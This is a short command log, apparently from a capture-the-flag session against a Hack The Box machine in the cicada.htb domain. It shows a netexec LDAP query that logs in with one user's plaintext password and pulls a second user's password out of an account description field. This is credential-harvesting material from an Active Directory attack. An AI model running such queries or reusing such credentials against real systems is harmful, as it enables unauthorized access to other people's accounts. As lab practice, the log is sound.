@@ -1,0 +1,11 @@
+### [2026-04-01 00:49:32] netexec ldap 10.129.231.149 -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZp!8 --query (sAMAccountName=david.orelious) description
+
+$ netexec ldap 10.129.231.149 -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZp!8 --query (sAMAccountName=david.orelious) description
+
+LDAP                     10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never)
+LDAP                     10.129.231.149  389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP                     10.129.231.149  389    CICADA-DC        [+] Response for object: CN=David Orelious,CN=Users,DC=cicada,DC=htb
+LDAP                     10.129.231.149  389    CICADA-DC        description          Just in case I forget my password is aRt$Lp#7t*VQ!3
+
+# Exit code: 0
+# Duration: 2026-04-01 00:49:33
